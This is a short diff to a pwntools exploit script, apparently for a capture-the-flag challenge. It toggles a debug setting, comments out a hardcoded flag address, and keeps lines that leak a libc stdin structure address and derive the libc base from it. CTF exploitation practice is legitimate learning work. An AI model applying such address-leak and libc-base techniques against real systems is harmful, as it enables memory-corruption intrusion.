@@ -2,7 +2,7 @@ from pwn import *
 from pwn import p64,u64
 
 
-debug = 0
+debug = 1
 gdb_is = 0
 # context(arch='i386',os = 'linux', log_level='DEBUG')
 context(arch='amd64',os = 'linux', log_level='DEBUG')
@@ -26,7 +26,7 @@ _IO_2_1_stdin_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
 info(f'_IO_2_1_stdin_ -> {hex(_IO_2_1_stdin_addr)}')
 
 
-flag_addr = 0x7f511f4e6700
+# flag_addr = 0x7f511f4e6700
 
 
 libc.address = _IO_2_1_stdin_addr - libc.sym['_IO_2_1_stdin_']
